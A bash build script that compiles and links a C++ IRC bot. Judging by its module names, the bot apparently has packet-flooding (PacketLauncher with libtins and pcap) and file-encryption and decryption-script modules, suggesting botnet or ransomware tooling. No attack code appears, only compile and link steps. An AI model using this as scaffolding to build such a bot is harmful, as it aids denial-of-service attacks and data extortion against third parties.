#!/bin/bash

# Enable or disable features
ENABLE_PING_ACTION=1
ENABLE_ENCRYPT_ACTION=1

# Initialize object file variables
PING_ACTION_OBJ=""
PACKET_LAUNCHER_OBJ=""
ENCRYPT_ACTION_OBJ=""
CRYPTO_MANAGER_OBJ=""
ENABLE_PING_FLAG=""
ENABLE_ENCRYPT_FLAG=""
FS_DECRYPTOR_OBJ=""
GEN_SCRIPT_OBJ=""

# Compile PingAction if enabled
if [ "$ENABLE_PING_ACTION" -eq 1 ]; then
    echo "Compiling PingAction.cpp"
    g++ -std=c++17 -Wall -Wextra -Iinclude -DENABLE_PING_ACTION -c PingAction.cpp -o PingAction.o
    PING_ACTION_OBJ="PingAction.o"
    echo "Compiling PacketLauncher.cpp"
    g++ -std=c++17 -Wall -Wextra -Iinclude -c PacketLauncher.cpp -o PacketLauncher.o
    PACKET_LAUNCHER_OBJ="PacketLauncher.o"
    ENABLE_PING_FLAG="-DENABLE_PING_ACTION"
fi

# Compile EncryptAction if enabled
if [ "$ENABLE_ENCRYPT_ACTION" -eq 1 ]; then
    echo "Compiling EncryptAction.cpp"
    g++ -std=c++17 -Wall -Wextra -Iinclude -c EncryptAction.cpp -o EncryptAction.o
    ENCRYPT_ACTION_OBJ="EncryptAction.o"
    echo "Compiling CryptoManager.cpp"
    g++ -std=c++17 -Wall -Wextra -Iinclude -c CryptoManager.cpp -o CryptoManager.o
    g++ -std=c++17 -Wall -Wextra -Iinclude -c FileSystemDecryptor.cpp -o FileSystemDecryptor.o
    g++ -std=c++17 -Wall -Wextra -Iinclude -c GenDecryptionScript.cpp -o GenDecryptionScript.o
    CRYPTO_MANAGER_OBJ="CryptoManager.o"
    ENABLE_ENCRYPT_FLAG="-DENABLE_ENCRYPT_ACTION"
    FS_DECRYPTOR_OBJ="FileSystemDecryptor.o"
    GEN_SCRIPT_OBJ="GenDecryptionScript.o"
fi

# Compile main source files with the same definitions
echo "Compiling main source files"
g++ -std=c++17 -Wall -Wextra -Iinclude $ENABLE_ENCRYPT_FLAG -c BotMain.cpp -o BotMain.o
g++ -std=c++17 -Wall -Wextra -Iinclude $ENABLE_PING_FLAG $ENABLE_ENCRYPT_FLAG -c IrcClient.cpp -o IrcClient.o
g++ -std=c++17 -Wall -Wextra -Iinclude -c MessageParser.cpp -o MessageParser.o
g++ -std=c++17 -Wall -Wextra -Iinclude -c GeneralUtils.cpp -o GeneralUtils.o

# Link object files
echo "Linking object files"
g++ BotMain.o IrcClient.o MessageParser.o GeneralUtils.o $PING_ACTION_OBJ $PACKET_LAUNCHER_OBJ $ENCRYPT_ACTION_OBJ $CRYPTO_MANAGER_OBJ $FS_DECRYPTOR_OBJ $GEN_SCRIPT_OBJ -o irc_bot -lcryptopp -lircclient -ltins -lpcap -s

echo "Build finished"